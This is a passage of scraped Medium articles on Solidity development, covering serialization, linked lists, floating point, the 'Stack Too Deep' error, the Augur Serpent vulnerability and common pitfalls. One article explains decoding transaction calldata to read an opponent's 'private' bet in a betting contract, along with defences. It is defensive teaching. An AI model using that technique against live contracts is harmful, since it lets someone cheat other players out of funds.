Contracts known as Transaction Ordering/Front Running\u2026medium.comSubverting the Circular Reference Error in SoliditySubverting the Circular Reference Error in SolidityRecently in my Solidity adventures I have been working on a simple messaging board contract (still in development) with\u2026medium.comIf you find these stories useful then follow our Coinmonks publication and learn more about blockchain and building Dapps.Click to learn more about Solidity", "responses": 1, "tags": ["Solidity", "Technology", "Programming", "Solidity Tutorial", "Learning"]}, {"title": "Serializing string arrays in solidity", "post_link": "https://medium.com/hackernoon/serializing-string-arrays-in-solidity-db4b6037e520?source=search_post", "author_name": "vasa", "author_link": "https://medium.com/@vaibhavsaini_67863", "publish_date": "2018-06-06", "last_modified_date": "2018-06-26", "readtime": "2.38", "claps": 247, "voters": 34, "content": "Serializing string arrays in solidityvasaFollowJun 6, 2018 \u00b7 3 min readTL;DR This GitHub repository is all you need.Solidity is still in development and that\u2019s why it still lacks in a lot of features that a good programming language should have. One of the features which solidity is missing is that it cannot return or take multi-dimensional arrays as input. Well, that does not seem important but when we talk about strings, we realize that they are just arbitrary-length byte array(i.e. byte[]). So when you create a string array, you are creating a two-dimensional byte array(i.e. byte[][]). This is where we all get stuck. Kinda like a trap\u2026it\u2019s a trap!That\u2019s enough of talking, let\u2019s get to work. The easiest and the most efficient way to get over this problem is to serialize the strings in the array(converting the strings in the array into byte form) and send all of them in one go. After we receive the string array in the byte form we can either pass the byte array as input to another solidity function or send it to user-end(node.js api) where we will de-serialize it back to the string array. Let\u2019s see how it works.Step 1: Serialize & De-serialize using solidityFor serializing/de-serializing in solidity we will use Seriality which can be used to serialize and de-serialize any data type in solidity. Thanks to pouladzade.serialize.solYou will get some output like this (for startindex=1, endindex=2).0x737472696e6731000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007737472696e6732000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007737472696e6733000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007Now, pass this bytes buffer into getString()and you will get your strings back!Note: You have to include Seriality files to your project to make the contract working. You can do that from here.Step 2: De-serialize the byte buffer using javascriptNow, using javascript we can get our string array back.deserialize.jsPutting the above byte output in the js function we get the following output.[\u201cstring1\u201d, \u201cstring2\u201d]Voila, you successfully got your array back!easy as that!This was just about the strings. You can do a lot of stuff using Seriality.Learned something? Click the \ud83d\udc4f to say \u201cthanks!\u201d and help others find this article.Hold down the clap button if you liked the content! It helps me gain exposure .Want to learn more? Checkout my previous articles.Quantum Computing: Is it the end of blockchain?Experts are suggesting quantum computing may render blockchain obsolete. As the tech giants such as Google and IBM are\u2026hackernoon.comEOS 101: Getting started with EOS, Part 1The only blockchain which has blocktime of less than a second: 0.5 sec!hackernoon.comDifference between SideChains and State ChannelsA complete comparison of the two scaling methods.hackernoon.comSetting up your first distributed private storage network on IPFS: Part 1IPFS Private Storage Network Seriesmedium.com13 sidechain projects every blockchain developer should know aboutThe whole world is going through the blockchain revolution. But wait\u2026is this really what we dreamed of? Present\u2026medium.comClap 50 times and follow me on Twitter: @vasa_develop", "responses": 1, "tags": ["JavaScript", "Solidity", "Ethereum", "Technology", "Arrays"]}, {"title": "Serpent Compiler Vulnerability, REP & Solidity Migration", "post_link": "https://medium.com/@AugurProject/serpent-compiler-vulnerability-rep-solidity-migration-5d91e4ae90dd?source=search_post", "author_name": "Augur", "author_link": "https://medium.com/@AugurProject", "publish_date": "2017-07-28", "last_modified_date": "2018-06-08", "readtime": "2.55", "claps": 132, "voters": 28, "content": "Serpent Compiler Vulnerability, REP & Solidity MigrationAugurFollowJul 28, 2017 \u00b7 3 min readUpdate: REP migration is complete!If you are a REP holder, there is nothing you need to do!New REP contract : 0xE94327D07Fc17907b4DB788E5aDf2ed424adDff6UPDATE: All EtherDelta and Oasis users have been refunded / paid back. Please let us know if you have any questions or problems.Augur\u2019s smart contracts are currently written in Serpent, a low-level programming language that pre-dates the widely-used, higher-level Solidity language. This past May, we hired Zeppelin Solutions to perform a formal security audit of the Serpent compiler. After two months of review, Zeppelin has published their audit results. [1]The most hair-raising finding in Zeppelin\u2019s audit report is a previously-unknown buffer overflow vulnerability in the Serpent compiler. This, combined with Serpent\u2019s un-enforced types and a bug in Serpent\u2019s computation of memory addresses, caused a non-loss-of-funds vulnerability in the REP token contract. The vulnerability allows someone to increase the token creation timestamp, indefinitely disabling transfers of the token. For a technical breakdown of the vulnerability, please read Zeppelin\u2019s analysis.Over the past two weeks, Augur and Zeppelin have been working around-the-clock on a strategy to migrate REP to a new, secure contract. The new REP contract is written in Solidity, and is derived from OpenZeppelin\u2019s ERC20 token contracts, which have undergone extensive security audits. Today, at 10:01 AM PST, the Augur team intentionally triggered the vulnerability, increasing the creation timestamp by about 31 billion years. The old Serpent REP contract is now frozen: REP transfers can no longer be carried out using the old contract.Right now, we are copying all REP balances to the new Solidity REP contract. If you are a REP holder, there is nothing you need to do! As soon as the REP migration is complete, your REP balance will be exactly as it was before the migration. The REP migration should only take a couple hours, if all goes well.Serpent REP Token Link // Solidity REP Token LinkWe notified exchanges, wallets, and block explorers on 2017 July 27 at 10:00am PST. The Augur and Zeppelin teams are currently working with them to update their software to use the new REP contract.Confirmed: Poloniex, Kraken, Bittrex, Liqui, Bity, Gatecoin, BTER, Mr.Ripple, GateHub, HitBTC, BX.in.th, ShapeShift, Changelly, EtherScan, Exodus, Jaxx, Parity, MyEtherWallet, MetaMask, OASIS, EtherDelta and CryptoDerivatives.Non-Confirmed: EtherCamp, Yunbi, Cryptopia, and BX Thailand.Our technical team takes Augur\u2019s security extremely seriously. This is why we paid to have the Serpent compiler audited, and why we are deeply concerned by the audit\u2019s results. Whether or not to migrate Augur\u2019s smart contracts to Solidity has been a topic of ongoing debate within our team for over a year now. However, after reading the Serpent audit report, our back-end team is now in unanimous agreement: we have to migrate to Solidity.We estimate that migrating all of our smart contracts (about 4,400 lines of code total) to Solidity will take about 6 weeks. The migration will be a simple translation from one language to another. This is a straightforward process, similar to translating a document written in English into another language you\u2019re fluent in, then running your translated text through a series of tests to ensure nothing was lost in translation.Our team is focused on the REP migration today. Please join our Slack if you have any questions about either the new REP contract or the Solidity migration. We will post a follow-up as soon as the REP migration is completed!FOOTNOTES:[1] We shared a draft of the compiler report with Vitalik, which prompted his tweet about Serpent: \u201cPSA: I now consider Serpent outdated tech; not nearly enough safety protections by current standards.\u201d https://twitter.com/VitalikButerin/status/886400133667201024", "responses": 3, "tags": ["Ethereum", "Augur", "Bitcoin", "Blockchain", "Prediction Markets"]}, {"title": "Solidity Pitfalls and How to Avoid Them", "post_link": "https://medium.com/hackernoon/solidity-pitfalls-and-how-to-avoid-them-24ba87735c7a?source=search_post", "author_name": "Michiel Mulders", "author_link": "https://medium.com/@michielmulders", "publish_date": "2018-03-23", "last_modified_date": "2018-05-28", "readtime": "3.73", "claps": 624, "voters": 41, "content": "Solidity Pitfalls and How to Avoid ThemMichiel MuldersFollowMar 23, 2018 \u00b7 4 min read\u201cThe currently unrivaled programming language for smart contracts is Solidity for the Ethereum blockchain.\u201d - Alfred Shaffir iOlite.ioSolidity is still a new, fast-changing language which has some serious pitfalls. As with all new things, bugs and logical faults are inevitable. Luckily, the ICO craze has triggered a new movement of research into the security aspects of blockchain and high-level programming languages as certain smart contracts hold millions of dollars, making it a perfect target for hackers.This article is based on the following research paper: \u201cEthereum Smart Contracts: Security Vulnerabilities and Security Tools\u201d written by Ardit Dika at the Norwegian University of Science and Technology.ERC20 critical bugERC20 assumes two ways of performing a token transaction.The transfer function lets you send tokens to someone\u2019s address.For depositing tokens to a smart contract, you have to use the combination \u2018approve & transferFrom\u2019.But, when you send tokens to a smart contract using the transfer function, the smart contract won\u2019t detect your deposit request. This results in permanently losing your funds. A lot of novel developers have experienced this critical bug firsthand.Standards like ERC223 and ERC777 try to mitigate this bug. More specifically, ERC223 allows developers to send funds to an address or contract using the same function: transfer. ERC223 allows developers to handle incoming token transactions, and reject non-supported tokens. At last, the ERC223 token standard is more efficient as it\u2019s a one-step process, rather than the approve & transferFrom two-step process. In short, ERC777 focuses on adoption by offering a wide range of transaction handling mechanisms. \u2014 Source: Cointelligence.Unchecked send functionKalra S., Goel S., et al have recently published a research paper on analyzing the safety of smart contracts. They describe the problem of the unchecked send function: \u201cSince Solidity allows only 2300 gas upon a send call, a computation-heavy fallback function at the receiving contract will cause the invoking send to fail. Contracts that do not correctly handle such failed invocations and allow modifications to the global state following the failed send call, may incorrectly lead to loss of Ether.\u201dPublicly visible dataAll data on the Ethereum blockchain is publicly visible to anyone. Regardless of the positive impact Ethereum has, the benefits are limited by this property. Companies cannot use Ethereum to pay the wages of their employees as that would expose their monthly income.As you can see, there is a serious need for blockchains that introduce more security properties like encryption, data obfuscation, and secure transaction handling mechanisms. The Enigma project is doing a great thing with its so-called \u2018secret smart contracts\u2019.Unchangeable smart contractsOnce a smart contract is deployed, it\u2019s not possible to modify or alter it. It\u2019s advantageous as it represents a trustworthy platform. On the other side, due to this property, a significant number of smart contracts contain vulnerabilities that can be exploited gaining illegal profit.In addition, a common safety guide for ICOs is to use an arbitrary name when deploying their ICO smart contract on the testnet. It has happened before an ICO smart contract got hacked because attackers were able to locate the testnet smart contract weeks before the actual deployment on the main net, giving them enough time to find critical bugs.In 2016, a symbolic execution analysis tool (Oyente) was developed by Luu et al. This tool revealed 45% of the 19,366 smart contracts back then were vulnerable for at least one known security issue.Exceeding the maximum gas amountLet\u2019s end with a slightly funny problem. The GovernMental website was doing a jackpot. A large amount of 1100 ETH could be claimed by the lucky winner. However, because of a bug in the code, a gas amount of 5057945 was needed to claim the Ether. However, back then, the maximum gas amount for a transaction is only 4712388.The problem was caused by an array that looped all creditors and deleted them one by one, returning the winner. Even Vitalik Buterin jumped in and gave this piece of advice: \u201cIn general, it seems like we need one new piece of standard advice for contract developers: make sure that if you have arrays that users can extend then either find some way for each user to separately handle the array elements associated with themselves or split up the work among several transactions.\u201dLuckily, this problem has been solved now. Such hard-to-find problems will keep popping up in the future.Golden Tip: Use Experts and Audit Audit Audit!I don\u2019t want to be rude, but don\u2019t trust novel Solidity developers to code your ICO smart contract. Proper developers know the problems that have occurred in the past and know how to respond to it.Most Solidity contracts being developed will be used for ICOs, so we are speaking about millions of dollars. Have your smart contract audited by several independent organizations, it\u2019s for your own safety.Another possibility is to use platforms that assist you in the creation of a smart contract. The iOlite product is a community-driven tool that accepts natural language or any other programming language as input for the creation of smart contracts. Solidity experts are able to define structures linked to their smart contract code. iOlite uses a modified version of the Stanford Natural Language Processing engine. The whole idea is based on machine training, driven by a community of Solidity experts. The benefit of iOlite is that it allows you to craft smart contracts easily and for free.Find out more about iOlite.io or join their Telegram channel.", "responses": 5, "tags": ["Ethereum", "Blockchain", "Blockchain Technology", "Blockchain Development", "Ethereum Blockchain"]}, {"title": "Linked Lists in Solidity", "post_link": "https://medium.com/coinmonks/linked-lists-in-solidity-cfd967af389b?source=search_post", "author_name": "Austin Thomas Griffith", "author_link": "https://medium.com/@austin_48503", "publish_date": "2017-11-14", "last_modified_date": "2018-06-14", "readtime": "4.72", "claps": 250, "voters": 28, "content": "Linked Lists in SolidityAustin Thomas GriffithFollowNov 14, 2017 \u00b7 5 min readWe need an efficient structure to store a large number of entries in a smart contract that we can quickly traverse. It must also be very cheap to add new items, even as the amount of items grows.The mapping data type in solidity is wonderful for storing information, but very hard to look through if you don\u2019t already know the index of each item.With a linked list you store an index to the next piece of data in the current piece of data like a chain. To make writes our most efficient operation, we want to add items to the front of the list by keeping track of a head index. When we want to add a new element we put the existing head index in as the new element\u2019s next index and then set the head to the new element. This operation costs the same computational amount for a list of any size. When we want to look through the data, we start at the head index and follow the trail of next indexes.Let\u2019s create a contract called LinkedList that stores a list of Objects that are all linked together. An Object is a struct data type that holds an index to the next object along with a name and a number. For demonstration purposes, let\u2019s say this contract is meant to hold voting information from small, fictitious districts where name is a candidate\u2019s name and number is the number of votes that candidate received in the district.Again, we will skip the compile, deploy, and scripting mechanics assuming readers have followed along from previous explorations.node compile LinkedListnode deploy LinkedList0xFD400Ff1b9f23b105386350309C0616A50c969bEThen, let\u2019s populate the contract with a bunch of transactions similar to:node contract addEntry LinkedList null 93 \"Bram\"(This entry says candidate Bram received 93 votes.)Let\u2019s have a bunch of districts report in with their results:node contract addEntry LinkedList null 26 \"Hal\"node contract addEntry LinkedList null 23 \"Julian\"node contract addEntry LinkedList null 27 \"Hal\"node contract addEntry LinkedList null 33 \"Eva\"node contract addEntry LinkedList null 23 \"Julian\"node contract addEntry LinkedList null 42 \"Eva\"node contract addEntry LinkedList null 34 \"Hal\"node contract addEntry LinkedList null 12 \"Julian\"node contract addEntry LinkedList null 57 \"Hal\"Then, we can run our getTotal() function to count the total votes:node contract getTotal LinkedListTOTAL:370It is free for us to run the getTotal() off-chain, but if we need to change the state of the contract we will have to pay for it in gas. Let\u2019s explore the gas costs a little more to figure out what we are dealing with.Let\u2019s run the setTotal() function which will run the getTotal() just like we did off-chain, but then it will write it to the writtenTotal uint. Because there is a change of state, every single contract in the network will have to iterate through our linked-list and deterministically reach the same total. This will cost us some gas:node contract setTotal LinkedList(Transaction on etherscan.io)To run through the list, keep track of a total, and eventually write that total to state, it cost 0.001034044 ether.(See all 349 operations on etherscan.io)Now, if we change the same state without traversing the list using the resetTotal() function, let\u2019s see what that costs:node contract resetTotal LinkedList(Transaction on etherscan.io)Wow, that was cheap, only 0.000292974 ether. So maybe we can subtract those two numbers and probably figure out how much it costs to traverse the list?In USD, assuming ETH is about $300, paying 22 gwei in gas, it\u2019s about $0.09 to set the value of our uint and about $0.22 to traverse our list of 10 entries keeping a running total. Looking back at adding an entry, at the same rate, it cost about $0.63Keeping separation of concerns in mind, let\u2019s create a second contract that will interact with the LinkedList contract instead of writing the functionality directly into the LinkedList contract. This contract will be called the Teller and will count the votes once a quorum is reached.Using the enum data type we can code the Teller to perform like a state machine. Notice how the countVotes() function changes the state as it detects new conditions. The most important concept here is the limitPerTurn. Because of gas limits (see halting problem), we won\u2019t be able to traverse the entire list in one transaction. What we have to do is move through part of it and then keep track of the running totals between transactions. In production, we will use the msg.gas variable, but for demonstration purposes, we will just count four at a time.node compile Tellernode deploy Teller0x3c67a0e63a967810fcC5e48F9a94c6D561D9a7cdThe current getTotal() of the LinkedList contract is returning 370. So if we run the countVotes() function against the LinkedList contract address, the Teller should stay in state 0:node contract countVotes Teller null 0xFD400Ff1b9f23b105386350309C0616A50c969bEnode contract getState TellerSTATE:0Let\u2019s throw in one last vote count to push the total past the require quorum of 400:node contract addEntry LinkedList null 32 \"Bram\"node contract getTotal LinkedListTOTAL:402Now, when we trigger the countVotes() function, the state should change to 1 which represents the state of CountingVotes:node contract countVotes Teller null 0xFD400Ff1b9f23b105386350309C0616A50c969bEnode contract getState TellerSTATE:1Let\u2019s inspect a few variables in the Teller contract before we start tallying votes:node contract getCounted TellerCOUNTED:0node contract getCurrentPointer TellerCURRENTPOINTER:0x0000000000000000000000000000000000000000000000000000000000000000Now let\u2019s fire off the first round of vote counting which should total up the first four votes:node contract countVotes Teller null 0xFD400Ff1b9f23b105386350309C0616A50c969bEnode contract getCounted TellerCOUNTED:4node contract getCurrentPointer TellerCURRENTPOINTER:0xa286649c24c2fe84cceb42001867f0d66be3fcc1e9612f9974ed74d6fb86375fWe can also see who is in the lead after the first four votes are totaled but since the state is still CountingVotes, we know the election isn\u2019t finished:node contract getWinningName TellerWINNINGNAME:Halnode contract getWinningVotes TellerWINNINGVOTES:91node contract getState TellerSTATE:1Let\u2019s finish the election off by running the countVotes() function until the state changes to 2 (ElectionFinished):node contract countVotes Teller null 0xFD400Ff1b9f23b105386350309C0616A50c969bEnode contract countVotes Teller null 0xFD400Ff1b9f23b105386350309C0616A50c969bEnode contract getState TellerSTATE:2Now we can be confident that we have selected our true winner and our election is finished:node contract getWinningName TellerWINNINGNAME:Halnode contract getWinningVotes TellerWINNINGVOTES:144node contract getTotal Teller null BramTOTAL [Bram]:125node contract getTotal Teller null EvaTOTAL [Eva]:75node contract getTotal Teller null JulianTOTAL [Julian]:58This linked list and partial traversing concept will be the cornerstone of how we will draw a consensus on the blockchain. Miners will make requests off-chain and post their results on-chain. Then, we will iterate through a list adding up \u201cstaked\u201d tokens with respect to their results to find the best answer.This is an excerpt from the Concurrence Linked List Exploration.Read more about Concurrence and our other explorations.", "responses": 1, "tags": ["Ethereum", "Solidity", "Smart Contracts", "Blockchain", "Blockchain Development"]}, {"title": "Your \u201cprivate\u201d Solidity Variable is Not \u201cprivate.\u201d Save it before it becomes Public", "post_link": "https://medium.com/hackernoon/your-private-solidity-variable-is-not-private-save-it-before-it-becomes-public-52a723f29f5e?source=search_post", "author_name": "vasa", "author_link": "https://medium.com/@vaibhavsaini_67863", "publish_date": "2018-07-18", "last_modified_date": "2018-07-20", "readtime": "3.37", "claps": 255, "voters": 29, "content": "Your \u201cprivate\u201d Solidity Variable is Not \u201cprivate.\u201d Save it before it becomes PublicHow to keep secrets on EthereumvasaFollowJul 18, 2018 \u00b7 4 min readIf you have worked with Ethereum then you must have written smart contracts, and thus most probably used the keyword private . It seems like it does its work well. Right? Well, actually not when it comes to keep secrets on ethereum.Anyone in this world with a blockchain explorer can see your so called private variables.Sounds ridiculous, but yes its true. Let\u2019s see how to hack a contract.Hacking Smart contractsLet\u2019s take a vulnerable contract.It\u2019s basically a game: an odd-even multiplayer game contract, which chooses the winner based on the numbers guessed. Each player chooses a number and if the sum is even then the first player wins, otherwise the second player wins.The game contract stores the bets of two players in players mapping. Since this variable is declared as private, the second player cannot read the data. Each player has to transfer 1 Ether to the contract in order to play. This condition is checked using require. Once the second player places his bet, the winner is selected based on the odd-even logic and gets the whole bet amount of both players.Let\u2019s place our bet(execute play(100)). As the number we bet is private so no one can see it. It\u2019s like a secret\u2026But wait. Let\u2019s see what actually happened when we executed this transaction.State changes in Ethereum are usually done through a transaction. If the receiving account is a contract in a transaction, the EVM runs the contract\u2019s code either to completion or until the execution runs out of gas.Details, such as which method to call and input parameters are specified in the data field of each transaction. For example, for modifying a private state variable in the contract, you need to pass the \u201cprivate\u201d value to the setter method through a transaction. Considering the fact that every transaction data is visible to all the nodes, you could easily read private variables if you know the transaction.Let\u2019s look into the odd-event contract that we discussed above and see how you can decode the transaction data.For every method call, the transaction data will have 2 fields:Method selectorMethod parametersIn our smart contract, call to the method will have the following transaction data. Let\u2019s try to decode this.0x6587f6ec0000000000000000000000000000000000000000000000000000000000000064First 4 bytes of the transaction data always points to the method signature. It is calculated by taking the first 4 bytes of keccak hash of the method signature. In our example, it is bytes4(keccak256('play(uint)')) which is 0x6587f6ec.The following characters point to the parameter of the specified method. Each parameter is represented by the hex value of the input padded to 32 bytes. If 100 is the input parameter to play method, then the transaction data for that parameter is:0x0000000000000000000000000000000000000000000000000000000000000064BUSTED!Well, now any one with a block explorer and a bit of knowledge can place his 2nd bet accordingly and rip you off.This can get more complex if there are more parameters and they are dynamic. You can get more details about argument encoding from the official solidity documentation.The question now comes is that is there any way to avoid this kind of hack? Well there are some solutions to this:One is to use Quorum instead of Ethereum. It basically allows you to send private transactions. You can specify addresses of the recipients(in this case the address of the contract) in privateFor variable which will only allow the recipients to see the data parameter; while others will receive a blank data parameter. (I have left a lot of details here on how the it works. You can find them here).Another way to tackle this problem while using Ethereum only is using something called commit reveal pattern. In this method, users first submit the hash of a secret information and when everyone else has submitted theirs, each participant reveals their vote, which can be back verified. This is not suited for all the applications, and it adds a lot of complexity on users, but it\u2019s a starting point for further explorations.Thanks for reading;)Learned something? Press and hold the \ud83d\udc4f to say \u201cthanks!\u201d and help others find this article.Hold down the clap button if you liked the content! It helps me gain exposure .Want to learn more? Checkout my previous articles.5 resources to get started with ethereumUltimate guide for understanding & starting with ethereum.hackernoon.comContractPedia: An Encyclopedia of 40 Smart Contract PlatformsA Complete List of all Smart Contract supportive Platforms The blockchain is changing the world as we know it today. It\u2026hackernoon.comConsensusPedia: An Encyclopedia of 30 Consensus AlgorithmsA complete list of all consensus algorithms.hackernoon.comDifference between SideChains and State ChannelsA complete comparison of the two scaling methods.hackernoon.comEOS 101: Getting started with EOS, Part 1The only blockchain which has blocktime of less than a second: 0.5 sec!hackernoon.comClap 50 times and follow me on Twitter: @vasa_develop", "responses": 3, "tags": ["Ethereum", "Solidity", "Private Variables", "Solidity Issues", "Private Solidity Variable"]}, {"title": "BANKEX Foundation: floating point library for Solidity", "post_link": "https://blog.bankex.org/bankex-foundation-floating-point-library-for-solidity-a6dd87636693?source=search_post", "author_name": "BANKEX", "author_link": "https://blog.bankex.org/@bankexcom", "publish_date": "2017-10-19", "last_modified_date": "2018-06-04", "readtime": "2.77", "claps": 775, "voters": 26, "content": "BANKEX Foundation: floating point library for SolidityBANKEXFollowOct 19, 2017 \u00b7 3 min readBANKEX Foundation presents an open-source platform for collaborative work, created to promote technologies in banking and fintech sectors. It means that BANKEX Foundation is building an ecosystem that will help ensure transparency, stability and support, needed to implement blockchain technologies for the purpose of commercial integration. In this article we are explaining floating point library for Solidity, a non-profit product created by BANKEX for community.\u2014 Implementation of floating point number will expand capabilities of Ethereum in terms of more general and convenient calculations (and get rid of artificial decimal multipliers).\u2014 Don\u2019t forget about the convenience \u2014 we are used work with numbers containing decimal point.\u2014 And finally \u2014 for precision of calculations in financial world special \u201cDecimal\u201d data type is traditionally used, and experience implementing floating point numbers can be transferred to this type also.It\u2019s known that at the current stage of development, Solidity can only operate on integers (up to 256 bit, signed and unsigned), with fixed point numbers pushed for further development (in a form of ufixed/fixed type), and without any solid plans for floating point implementation. To fix this issue, make programming more convenient and open opportunities to use of wider classes of functions we\u2019ve started a development of binary256 IEEE standard floating point numbers implementation using available functions and types such as uint256, bytes32, additions, multiplications and bit shifts.We encourage an Ethereum community to contribute to development of this library and hope to see it included either to EVM or as precompiled contract in further versions of Ethereum.Current branch is located at:https://github.com/BankEx/solidity-float-point-calculationFor the initial public release, we have focused on basic functions necessary for further implementations of standard math library.This version includes:encoding and decoding of packed 256 bit representation (in a form of bytes32 base type) to intermediate representation of three unsigned 256 bit integers for sign, mantissa and exponent. Intermediate representation is more convenient for basic operations such as addition.Addition, subtraction, multiplication and naive divisionFast inverse square root and fast divisionLog2 functionOne of the most difficult design decisions was implementation of division operation. As we all know, division operation is always more expensive and slower than addition or multiplication, and on Ethereum network that would incur additional gas price. We have implemented two division algorithms \u2014 one is naive, that obtains one bit of mantissa at the time, requiring more than 200 integer divisions and bit shifts in total. Another algorithm was based on fast inverse square root, with great details about inverse square root can be found in a work of Matthew Robertson.This algorithm was expanded to 256 representation and implemented. Both fast inverse square root and fast division provide relative precision better than 0.01 that can be tuned further at the price of performance.From the long list of standard math functions float logarithm of a base two was implemented to demonstrate use of basic operations for composition of more complicated functions.This library is not ready for production yet, although binary encoding of numbers should not change. Current problems and further work can be found in github repository. Feel free to submit pull requests with new algorithms or other implementations.Motivation:Why implement it in solidity: reference implementation in Solidity can be easily transformed to implementations in other languages for precompiled contract creationWhy binary256: 32 bytes is a natural storage slot length and using lesser sizes would not always be beneficial in terms of storage and all operations except float division don\u2019t have a large dependency in gas price on argument structureWhy implement float point type at the first place: we believe that at some point float point operations will be necessary to implement in solidity. For example a \u201cDecimal\u201d data type is necessary for convenience of financial operations and experience gained during creation of float type can be transferedBy ALEX VLASOV, BANKEX Blockchain developer and System ArchitectBANKEX is available at:Website \u2014 Telegram \u2014 Twitter \u2014 Facebook \u2014 Reddit \u2014 GitHub \u2014 Steemit", "responses": 1, "tags": ["Programming", "Ethereum", "Solidity", "Blockchain", "Crypto"]}, {"title": "", "post_link": "https://medium.com/@davekaj/i-initially-read-the-docs-at-http-solidity-readthedocs-io-en-develop-2e4e1f1bf0d1?source=search_post", "author_name": "Dave Kajpust", "author_link": "https://medium.com/@davekaj", "publish_date": "2018-01-28", "last_modified_date": "2018-06-16", "readtime": "0.2", "claps": 179, "voters": 27, "content": "Hello Dave,421Pratik AgarwalDave KajpustFollowJan 28, 2018 \u00b7 1 min readI initially read the docs at http://solidity.readthedocs.io/en/develop/.Then I watched this guys videos on ethereum dApp development \u2014 https://www.youtube.com/channel/UC8CB0ZkvogP7tnCTDR-zV7gThen I started looking into random projects that already built out smart contracts and I started trying to understand it, and run tests in the solidity IDE at https://remix.ethereum.orgI hope that helps!", "responses": 0, "tags": []}, {"title": "\u201cStack Too Deep\u201d- Error in Solidity", "post_link": "https://blog.aventus.io/stack-too-deep-error-in-solidity-5b8861891bae?source=search_post", "author_name": "Aventus Network", "author_link": "https://blog.aventus.io/@aventus", "publish_date": "2019-01-04", "last_modified_date": "2019-01-07", "readtime": "15.1", "claps": 301, "voters": 27, "content": "\u201cStack Too Deep\u201d- Error in SolidityAventus NetworkFollowJan 4 \u00b7 16 min readHappy New Year and may we all have great accomplishments in 2019! Aventus is welcoming you back from the winter holidays with a post related to errors in Solidity, by our very own, Alex Pinto.When one starts coding smart contracts in Solidity, sooner or later, s/he will hit a very annoying obstacle. The \u201cStack Too Deep\u201d error. It is easy to fall into this trap, and when that happens, it is often hard to find a way out. To be fair, the underlying reason is not in Solidity itself, but in the Ethereum Virtual Machine (the EVM), and so will likely affect other languages that compile into EVM (ie LLL, Serpent, Viper), but that is a subtle distinction in the day-to-day job of coding smart contracts.Surprisingly, given the level of annoyance this can cause, it is very hard to find good resources on how to deal with it, so I decided to write this post to try to shine some light on it, for my own benefit and for anyone else who may be despairing with it.In general terms, this error seems to be generated when the code needs to access a slot in the stack that is deeper than its 16th element (counting from the top downwards). How we get there, though, can be done in more than one way. This post does not aim to offer a full theory of how this error is generated: from my experience, there are too many ways to do it. But it will give a good rationale for a common trigger, and will hopefully make the reader more aware of how the EVM manages its stack. It may even be possible to extend the same logic to other situation where the error occurs, and look for ways to avoid it.In Solidity, most types (ie elementary types, like numbers, addresses and booleans for example, but not arrays, structs nor mappings) are passed by value to a function: when the function is called, a part of the stack (ie a stack frame) is allocated to hold the return position the program should go to when the function returns (the \u2018return address\u2019) and a copy of the function value-type input and output arguments. Each argument will normally hold a slot in the stack, where each slot is 256 bits.This provides the most basic way of hitting a \u201cStack Too Deep\u201d error: have a total of more than 16 input and output arguments. But in reality, if we want that function to do something useful, we will have to be very careful and probably have to reduce the number of arguments.To test this, I created a small contract in Remix like this:pragma solidity ^0.4.24;contract TestStackError {  event LogValue(uint);  function logArg(uint a1) public {    emit LogValue(a1);  }}Remix is great for an investigation like this because we can quickly write a contract and query it, but fundamentally because Remix gives a powerful debugger with opcode disassembly and a full listing of the stack, memory and storage. It\u2019s also easy to move back and forward through the code, giving one of the best debugging experiences I\u2019ve had in any language.This contract is very simple: it has no state variables and only one function, which also is extremely uncomplicated. This function takes only one argument and logs it.I copy this contract to a new file in Remix, compile it and deploy it. There should be no errors and warnings, and so I go to the Run tab, and hit Deploy.Then, I extend the list for the SimpleFunction contract, and enter a single value in the box in front of logArg. I press the button and check the output in the console:As you can see, I entered the value 7, and that was returned as the only element in the logs. Although logs are worth another post, there are a few things I should mention here.This is the JSON-formatted logs object of this call:logs [{  \"from\": \"0xef55bfac4228981e850936aaf042951f7b146e41\",  \"topic\": \"0xfcf771399d75a67a6d0e730ae98d34c40b6bfe6ebf8053b98ddf4da8c2706250\",  \"event\": \"LogValue\",  \"args\": {    \"0\": \"7\",    \"length\": 1  }}Logs are created by the emit keyword in solidity, which raise a solidity event and correspond to LOGn opcodes.Logs can be filtered by client-side applications running off-chain. A filter is a condition on any of the topics available in the log.A log always has a topic 0, which is an encoding of the event\u2019s signature.Further topics can be created by making an argument indexed. There can be up to 3 indexed arguments. The remaining ones are considered event dataIn this simple example, we can easily identify that there is only one topic (\"0xfcf771399d75a67a6d0e730ae98d34c40b6bfe6ebf8053b98ddf4da8c2706250\") and that the data are displayed as part of the args member of the log object. We can also verify the code is working as expected.Let\u2019s now test the limits of this contract and change the function to accept the maximum number of arguments.pragma solidity ^0.4.24;contract TestStackError {  event LogValue(uint);  function logArg(uint a1, uint a2, uint a3, uint a4,\tuint a5, uint a6, uint a7, uint a8,\tuint a9, uint a10, uint a11, uint a12,\tuint a13, uint a14, uint a15, uint a16  ) public {    emit LogValue(a16);  }}I have 16 input variables, no output variables, therefore I only need to use 16 stack slots. I invoke the function passing the values 1 to 16 and emit the last value. I check the logs and see the value 16. Brilliant, this works!Then, I make a very small change to my contract: I log the first argument instead:Wait, what?! Simply logging a different argument has turned a perfectly fine contract into a \u201cStack Too Deep\u201d error. Wow, what\u2019s going on in here?This is not something Solidity can elucidate. At that level, the change looks perfectly harmless. I need to go down into the EVM bytecode to understand what is going on. But before I do that, I want to make another test, to gather some clues. I create a third version of this contract, but logging a2 instead:pragma solidity ^0.4.24;contract TestStackError {  event LogValue(uint);  function logArg(uint a1, uint a2, uint a3, uint a4,\tuint a5, uint a6, uint a7, uint a8,\tuint a9, uint a10, uint a11, uint a12,\tuint a13, uint a14, uint a15, uint a16  ) public {    emit LogValue(a2);  }}This works, and logs the correct value. The same happens when I log a3. I hypothesise then that all the arguments between a2 and a16 can correctly be logged.The resulting opcodes are in these three files:log(a2)log(a3)log(a16)I compared all the 3 logs between themselves, and the very first thing that struck me was that they all differed in size (number of lines). The second thing is that they are remarkably equal until line 237, with only one exception. The code after this line is very different and apparently unpredictable. However, since that seems to come after the function has returned, I will simply ignore it.Then I focused on the one difference between line 237, occurring at line 198. I was happy to confirm an idea that I had thought could explain the stack too deep error \u2014 that in some place of the code we would logically need to call some non-existing DUP or SWAP opcode. That indeed seems to be the case here: all 3 versions are the same until line 237, except for one single difference on line 198:log(a2): DUP16log(a3): DUP15log(a16): DUP2The opcodes DUPn duplicate the value at the nth level of the stack. There are only 16 such opcodes, from DUP1 to DUP16. DUP1 pushes to the stack a copy of the value currently at the top, and DUP16 copies the 16th highest value in the stack. There is an evident relationship between the place of the variable in the argument list 